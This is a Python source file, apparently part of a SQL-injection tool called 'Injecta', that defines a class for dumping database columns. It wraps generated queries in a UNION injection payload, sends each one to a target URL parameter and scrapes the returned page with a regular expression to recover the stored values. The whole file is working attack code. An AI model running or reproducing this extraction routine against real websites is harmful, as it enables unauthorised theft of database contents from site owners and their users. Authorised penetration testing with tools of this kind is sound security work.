"""
Injecta — Data dumping
"""
from typing import Any, Dict, List, Optional


class DataDumper:
    def __init__(self, requester, config, logger, payloads, injection_info: Dict[str, Any]):
        self.req = requester
        self.config = config
        self.log = logger
        self.payloads = payloads
        self.info = injection_info

    def dump(self, url: str, param: str, db: str, table: str, column: str) -> List[str]:
        rows = []
        queries = self.payloads.dump_column(db, table, column)

        for q in queries:
            results = self._try_extract(url, param, q)
            if results:
                rows.extend(results)
                break

        return rows

    def _try_extract(self, url: str, param: str, sql: str) -> List[str]:
        results = []
        payload = f"' UNION {sql}-- -"
        _, resp_text, _ = self.req.test_raw(url, payload, param)
        if resp_text and len(resp_text) > 100:
            import re
            candidates = re.findall(r'(\w[\w$#@.\s-]+)', resp_text)
            if candidates:
                results = [c.strip() for c in candidates if len(c.strip()) > 1
                          and not c.strip().isdigit()
                          and c.strip().lower() not in ('select', 'from', 'where', 'null', 'union')][:50]
        return results
